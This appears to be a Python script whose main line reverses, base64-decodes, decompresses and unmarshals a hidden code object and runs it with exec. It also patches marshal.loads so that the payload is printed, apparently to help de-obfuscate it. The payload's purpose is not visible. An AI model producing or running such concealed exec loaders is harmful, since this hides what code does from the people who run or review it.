# Obfuscated by : Ferly Afriliyan (Ryougaa Hideki)
# Time  :  Saturday, April 13, 2024 08:40:02
# Platform : Windows-AMD64

import marshal
import dis
x = marshal.loads
def dump(*j):
    h = x(*j)
    print(f"exec(__import__('marshal').loads({j[0]}))")
    return h
#   dis.dis(h)

marshal.loads = dump
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));_execute=((_)(b'=oBGWSPABYDQLSUGXlXDsywmGbkRmdAxBmniYghuBjlitL1cKN18yxGO/ywWiC5ZDXCZvODKgW7i4l8poL6kU+lnQ96kTqZkjXMVJjayQhMyiEhmwKMkKDJxA7MmQiws6DFzCAkZLxJe'));exec(_execute)